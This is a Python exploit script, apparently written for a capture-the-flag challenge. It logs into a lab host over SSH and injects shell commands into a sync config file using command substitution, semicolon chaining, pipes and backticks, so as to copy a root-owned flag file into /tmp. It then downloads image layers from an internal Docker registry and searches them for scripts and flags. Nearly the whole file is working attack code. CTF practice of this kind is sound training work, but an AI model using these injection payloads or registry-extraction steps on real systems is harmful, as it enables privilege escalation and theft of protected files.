#!/usr/bin/env python3
"""Final attempt - command injection via config"""
import paramiko
import time

HOST = "instance.ctf.tdho.st"
PORT = 32971
USER = "player"
PASSWORD = "reyalp"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(HOST, port=PORT, username=USER, password=PASSWORD)

def cmd(c, timeout=15):
    stdin, stdout, stderr = ssh.exec_command(c, timeout=timeout)
    return (stdout.read() + stderr.read()).decode()

print("[*] FINAL FLAG EXTRACTION ATTEMPT")

# Based on the sync-agent.sh code, there might be command injection if the sync-loop
# executes the config value. Try shell command injection:

attacks = [
    # Command substitution
    'talldwarf-sync-command=$(cat /root/flag.txt > /tmp/flag.txt)',
    # Semicolon command chaining  
    'talldwarf-sync-command=true; cat /root/flag.txt > /tmp/f.txt',
    # Pipe command
    'talldwarf-sync-command=true | cat /root/flag.txt > /tmp/f2.txt',
    # Backticks
    'talldwarf-sync-command=`cat /root/flag.txt > /tmp/f3.txt`',
]

for i, attack in enumerate(attacks):
    print(f"\n[Attempt {i+1}] {attack[:60]}...")
    cmd(f'echo "{attack}" > /opt/mc/config/sync-request.conf')
    time.sleep(12)
    
    # Check all possible output locations
    for loc in ['/tmp/flag.txt', '/tmp/f.txt', '/tmp/f2.txt', '/tmp/f3.txt']:
        result = cmd(f"cat {loc} 2>/dev/null")
        if result.strip():
            print(f"\n*** FLAG FOUND at {loc} ***")
            print(result)
            ssh.close()
            exit(0)

# Try reading CHANGELOG
print("\n[Checking CHANGELOG]:")
print(cmd("cat /tmp/layer3_opt_mc_CHANGELOG.md"))

# One last attempt - maybe the sync-loop's actual behavior is in the watcher container
# Check the watcher image
print("\n[Checking watcher image for sync-loop.sh]:")
watcher_extract = '''python3 << 'PY'
import urllib.request
import json
import gzip
import tarfile
import io

reg = "http://172.27.0.1:5000"
img = "images/stolen-schematics-watcher"

# Try to get manifest for v1 tag
try:
    req = urllib.request.Request(
        f"{reg}/v2/{img}/manifests/v1",
        headers={"Accept": "application/vnd.docker.distribution.manifest.v2+json, application/vnd.oci.image.manifest.v1+json"}
    )
    with urllib.request.urlopen(req, timeout=5) as r:
        data = r.read().decode()
        manifest = json.loads(data)
        print("Watcher manifest:", json.dumps(manifest, indent=2)[:2000])
        
        # If it's an index, get the actual manifest
        if 'manifests' in manifest:
            real_digest = manifest['manifests'][0]['digest']
            req2 = urllib.request.Request(
                f"{reg}/v2/{img}/manifests/{real_digest}",
                headers={"Accept": "application/vnd.oci.image.manifest.v1+json"}
            )
            with urllib.request.urlopen(req2) as r2:
                manifest = json.loads(r2.read().decode())
        
        # Download small layers only
        if 'layers' in manifest:
            for i, layer in enumerate(manifest['layers'][-3:]):  # Last 3 layers
                digest = layer['digest']
                size = layer['size']
                if size < 50000:  # Only small layers
                    print(f"\\nLayer {i}: {digest} ({size} bytes)")
                    with urllib.request.urlopen(f"{reg}/v2/{img}/blobs/{digest}") as br:
                        blob_data = br.read()
                        decompressed = gzip.decompress(blob_data)
                        tar = tarfile.open(fileobj=io.BytesIO(decompressed))
                        
                        for member in tar.getmembers():
                            if 'sync-loop' in member.name or 'flag' in member.name:
                                print(f"  FOUND: {member.name}")
                                if member.isfile() and member.size < 10000:
                                    content = tar.extractfile(member).read().decode('utf-8', errors='ignore')
                                    print(content)
                        tar.close()
except Exception as e:
    print(f"Error: {e}")
PY
'''
print(cmd(watcher_extract, timeout=30))

ssh.close()
